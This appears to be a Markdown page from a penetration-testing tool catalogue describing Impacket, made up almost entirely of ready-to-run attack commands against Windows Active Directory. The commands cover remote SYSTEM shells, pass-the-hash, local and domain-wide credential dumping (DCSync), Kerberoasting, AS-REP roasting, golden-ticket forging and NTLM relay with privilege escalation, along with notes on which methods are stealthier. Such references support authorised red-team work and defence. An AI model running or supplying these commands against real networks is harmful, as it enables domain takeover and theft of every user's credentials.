---
name: Impacket
category: Service Enumeration
description: Python scripts for low-level network protocol and Active Directory interaction.
tags: [impacket, smb, kerberos, ad, psexec, secretsdump]
---

# Impacket

**Impacket** is a collection of Python classes and ready-to-use scripts for working with network protocols (SMB, MSRPC, LDAP, Kerberos). It powers a huge part of the AD attack toolkit: remote execution, hash dumping, Kerberoasting and relaying.

> `pipx install impacket` · scripts prefixed `impacket-` (e.g. `impacket-psexec`) · [github.com/fortra/impacket](https://github.com/fortra/impacket)

## Remote command execution

```bash
impacket-psexec DOMAIN/user:pass@10.0.0.5           # SYSTEM shell (noisy, creates service)
impacket-wmiexec DOMAIN/user:pass@10.0.0.5          # semi-interactive via WMI (stealthier)
impacket-smbexec DOMAIN/user:pass@10.0.0.5
impacket-atexec DOMAIN/user:pass@10.0.0.5 'whoami'  # via Task Scheduler
```

Pass-the-Hash on any of them:

```bash
impacket-wmiexec -hashes :<NTLM> administrator@10.0.0.5
```

## Credential dumping

```bash
impacket-secretsdump DOMAIN/user:pass@10.0.0.5              # local SAM + LSA
impacket-secretsdump -just-dc DOMAIN/user:pass@10.0.0.10    # DCSync: all domain hashes
impacket-secretsdump -hashes :<NTLM> administrator@10.0.0.5
```

## Kerberos attacks

```bash
# Kerberoasting — request service tickets (crack offline with -m 13100)
impacket-GetUserSPNs DOMAIN/user:pass -dc-ip 10.0.0.10 -request

# AS-REP roasting — users with pre-auth disabled (crack with -m 18200)
impacket-GetNPUsers DOMAIN/ -dc-ip 10.0.0.10 -usersfile users.txt -no-pass

# Golden/Silver tickets
impacket-ticketer -nthash <krbtgt_hash> -domain-sid <SID> -domain DOMAIN admin
```

## NTLM relay

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support           # relay captured auth
impacket-ntlmrelayx -t ldap://10.0.0.10 --escalate-user user
```

## Other handy scripts

```bash
impacket-smbclient DOMAIN/user:pass@10.0.0.5        # interactive SMB client
impacket-GetADUsers -all DOMAIN/user:pass -dc-ip 10.0.0.10
impacket-mssqlclient DOMAIN/user:pass@10.0.0.5 -windows-auth
impacket-smbserver share $(pwd) -smb2support        # quick SMB server for file transfer
```

> The engine behind [NetExec](#/tool/netexec) and many AD workflows. Pair with [Responder](#/tool/responder) (capture → relay) and crack roasted tickets in [hashcat](#/tool/hashcat).
